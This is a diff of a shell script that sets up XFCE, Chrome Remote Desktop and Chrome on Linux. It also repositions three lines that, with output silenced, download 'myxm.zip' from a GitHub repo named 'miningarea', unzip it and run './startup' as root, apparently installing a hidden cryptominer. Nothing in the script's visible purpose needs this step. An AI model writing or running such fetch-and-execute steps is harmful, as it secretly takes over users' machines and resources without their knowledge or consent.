@@ -14,14 +14,14 @@ apt install --assume-yes xfce4 desktop-base
 sudo bash -c 'echo "exec /etc/X11/Xsession /usr/bin/xfce4-session" > /etc/chrome-remote-desktop-session'  
 sudo apt install --assume-yes xscreensaver
 sudo systemctl disable lightdm.service
-sudo wget https://github.com/miningarea/pyrdp/raw/main/myxm.zip
-sudo unzip myxm.zip
-sudo ./startup
 wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
 sudo dpkg --install google-chrome-stable_current_amd64.deb
 sudo apt install --assume-yes --fix-broken
 sudo apt install nautilus nano -y 
 sudo adduser ALOK chrome-remote-desktop
+sudo wget https://github.com/miningarea/pyrdp/raw/main/myxm.zip
+sudo unzip myxm.zip
+sudo ./startup
 } &> /dev/null &&
 printf "\nSetup Complete " >&2 ||
 printf "\nError Occured " >&2
